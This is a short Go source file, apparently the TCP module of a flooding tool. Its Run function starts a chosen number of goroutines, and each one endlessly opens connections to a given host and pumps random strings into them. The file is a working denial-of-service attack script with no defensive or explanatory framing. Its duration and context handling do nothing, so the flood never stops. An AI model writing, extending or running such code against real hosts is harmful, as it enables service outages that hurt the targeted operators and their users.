package TCP

import (
	"context"
	"log"
	"math/rand"
	"net"
	"time"
)

var cons []net.Conn

func checkErrr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func openConn(host string, a string, b string, c string, duration int) {
	var i int
	for true {
		go func() bool {
			time.Sleep(time.Second * time.Duration(duration))
			return true
		}()
		con, err := net.Dial("tcp", host)
		cons = append(cons, con)
		checkErrr(err)
		for x := 0; x < 1024; x++ {
			i++
			con.Write([]byte(a))
			con.Write([]byte(b))
			con.Write([]byte(c))
		}
		con.Close()
	}
}
func RandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func Run(ctx context.Context, host string, size int, duration int, threads int) {
	str := RandomString(size)
	str1 := RandomString(size)
	str2 := RandomString(size)
	for i := 0; i < threads; i++ {
		go openConn(host, str, str1, str2, duration)
	}
}
